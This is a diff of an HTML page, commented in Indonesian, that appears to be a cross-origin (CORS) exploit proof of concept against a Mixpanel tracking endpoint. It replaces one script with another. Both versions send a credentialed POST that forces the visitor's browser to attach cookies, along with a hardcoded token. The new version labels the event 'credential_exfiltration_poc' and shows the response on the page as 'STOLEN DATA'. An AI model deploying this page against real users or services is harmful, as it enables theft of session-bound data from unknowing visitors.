@@ -17,43 +17,32 @@
     <pre id="result">Menunggu response dari server...</pre>
 
     <script>
-        // Endpoint yang rentan
-        const targetUrl = "https://api-js.mixpanel.com/track/?verbose=1&ip=1";
-        
-        // Payload untuk memicu track event
-        const payload = JSON.stringify([{
-            "event": "poc_cors_exploit",
-            "properties": {
-                "token": "9a430771cc242d2e1a07a66b00d4c553", 
-                "attacker_site": "fadhlur21.github.io"
-            }
-        }]);
+    // Endpoint Mixpanel yang lu temukan di Reqable sebelumnya
+    const targetUrl = "https://api-js.mixpanel.com/track/?verbose=1&ip=1";
+    
+    // Kita pancing server untuk memberikan response yang terikat dengan session
+    const payload = JSON.stringify([{
+        "event": "credential_exfiltration_poc",
+        "properties": { 
+            "token": "9a430771cc242d2e1a07a66b00d4c553" // Token dari localStorage lu
+        }
+    }]);
 
-        fetch(targetUrl, {
-            method: "POST",
-            mode: "cors",
-            credentials: "include", // Mencoba membawa cookie/session browser
-            headers: { "Content-Type": "application/x-www-form-urlencoded" },
-            body: "data=" + encodeURIComponent(payload)
-        })
-        .then(response => {
-            const originHeader = response.headers.get("access-control-allow-origin");
-            const credsHeader = response.headers.get("access-control-allow-credentials");
-            
-            console.log("Origin Reflected:", originHeader);
-            console.log("Credentials Is Allowed:", credsHeader);
-            
-            document.getElementById("status").innerText = "Got you!!!!";
-            document.getElementById("status").style.color = "#2ecc71";
-            return response.json();
-        })
-        .then(data => {
-            document.getElementById("result").innerText = JSON.stringify(data, null, 2);
-        })
-        .catch(err => {
-            document.getElementById("status").innerText = "Failed (CORS Blocked)";
-            document.getElementById("result").innerText = err;
-        });
-    </script>
+    fetch(targetUrl, {
+        method: "POST",
+        mode: "cors",
+        credentials: "include", // Memaksa browser mengirimkan cookie Anduril/Mixpanel
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: "data=" + encodeURIComponent(payload)
+    })
+    .then(response => response.json())
+    .then(data => {
+        // Tampilkan hasil pencurian di halaman
+        document.getElementById("result").innerText = "STOLEN DATA:\n" + JSON.stringify(data, null, 2);
+        console.log("Got u!!", data);
+    });
+</script>
+
+
 </body>
 </html>
